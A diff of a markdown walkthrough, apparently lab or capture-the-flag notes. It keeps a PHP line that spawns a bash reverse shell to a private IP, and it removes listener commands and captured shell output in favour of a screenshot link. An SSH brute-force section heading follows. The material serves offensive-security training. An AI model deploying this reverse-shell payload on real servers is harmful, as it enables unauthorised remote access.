@@ -73,28 +73,8 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.1.26.20/1234 0>&1'");
 ?>
 ```
 
-- Set up listener on attacker machine
-```
-┌──(kali㉿kali-99-590)-[~]
-└─$ nc -nvlp 1234
-listening on [any] 1234 ...
-```
-
-- Run the reverse shell by going to http://10.1.26.30:80/rev.php
-
-```
-┌──(kali㉿kali-99-590)-[~]
-└─$ nc -nvlp 9999
-listening on [any] 9999 ...
-connect to [10.1.26.20] from (UNKNOWN) [10.1.26.30] 49160
-bash: cannot set terminal process group (9061): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@srv-99-590:~/html$ whoami
-whoami
-www-data
-www-data@srv-99-590:~/html$
-```
-
+- Set up listener on attacker machine and go to http://10.1.26.30/rev.php to run the reverse shell
+![[php-rev-shell.png]]
 - Now we have a shell as the www-data user
 
 ### Method 3 - Brute Force SSH
